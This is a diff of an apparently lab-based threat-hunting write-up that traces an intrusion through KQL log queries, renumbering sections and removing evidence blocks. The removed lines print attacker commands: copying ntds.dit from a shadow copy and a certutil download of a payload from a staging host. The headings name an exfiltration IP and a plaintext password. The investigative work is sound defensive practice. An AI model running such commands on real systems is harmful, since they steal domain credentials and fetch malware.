@@ -89,11 +89,7 @@ EmberForgeX_CL
 | order by TimeGenerated asc
 ```
 
-| Artifact         | Value       |
-| ---------------- | ----------- |
-| Cloud Provider   | MEGA        |
-| Uploaded Archive | gamedev.zip |
-
+|
 ### Screenshot
 <img width="1000" height="315" alt="image" src="https://github.com/user-attachments/assets/19e0639e-25cd-4f62-9d19-b3628e2e0aca" />
 
@@ -162,61 +158,14 @@ EmberForgeX_CL
 | order by TimeGenerated asc
 ```
 
-## Evidence Identified
 
-```cmd
-copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Windows\Temp\nyMdRNSp.tmp
-```
-
-## Findings
-
-| Artifact            | Value    |
-| ------------------- | -------- |
-| Credential Database | ntds.dit |
 
 ### Screenshot
 <img width="862" height="288" alt="image" src="https://github.com/user-attachments/assets/4d5653e4-5ac3-45b7-b8b6-8205523666ff" />
 
 ---
 
-# 5. Exfiltration Tool Discovery - rclone.exe
-
-## Investigation Task
-
-The objective was to determine:
-
-* what tool was used to exfiltrate the stolen data,
-* whether the tool was legitimate software,
-* and how the attacker transferred files externally.
-
-## What I Looked For
-
-* Cloud synchronization utilities
-* File transfer tools
-* External upload commands
-* Repeated tool execution attempts
-* Suspicious command-line arguments
-
----
-
-## Query Used
-
-```kql
-EmberForgeX_CL
-| where CommandLine_s has "gamedev.zip"
-| project TimeGenerated, Computer, Caller_User_Name_s, CommandLine_s
-| order by TimeGenerated asc
-```
-
-
-### Screenshot
-
-<img width="1021" height="321" alt="image" src="https://github.com/user-attachments/assets/beb5f25e-259b-4988-a9f5-179427c83c85" />
-
-
----
-
-# 6. Exfiltration Destination IP - 66.203.125.15
+# 5. Exfiltration Destination IP - 66.203.125.15
 
 ## Investigation Task
 
@@ -257,7 +206,7 @@ EmberForgeX_CL
 
 
 
-# 7. Plaintext Credential Exposure - Summer2024!
+# 6. Plaintext Credential Exposure - Summer2024!
 
 
 ## Investigation Task
@@ -292,7 +241,7 @@ EmberForgeX_CL
 
 ---
 
-Q08 - Archive Method
+# 7. Archive Method - `Compress-Archive` |
 
 ## Investigation Task
 
@@ -318,14 +267,11 @@ EmberForgeX_CL
 | order by TimeGenerated asc
 ```
 
-The cmdlet is:
-
-Compress-Archive
 
 <img width="1005" height="336" alt="image" src="https://github.com/user-attachments/assets/6b339eff-f4b5-4ee8-b58c-eba398be3c03" />
 
 
-# 9. Staging Infrastructure Discovery - sync.cloud-endpoint.net
+# 8. Staging Infrastructure Discovery - sync.cloud-endpoint.net
 
 ## Investigation Task
 
@@ -361,18 +307,6 @@ EmberForgeX_CL
 | order by TimeGenerated asc
 ```
 
-## Evidence Identified
-
-```cmd
-certutil -urlcache -f http://sync.cloud-endpoint.net:8080/update.exe C:\Users\Public\update.exe
-```
-
-## Findings
-
-| Artifact           | Value                   |
-| ------------------ | ----------------------- |
-| Staging Server     | sync.cloud-endpoint.net |
-| Downloaded Payload | update.exe              |
 
 ### Screenshot
 
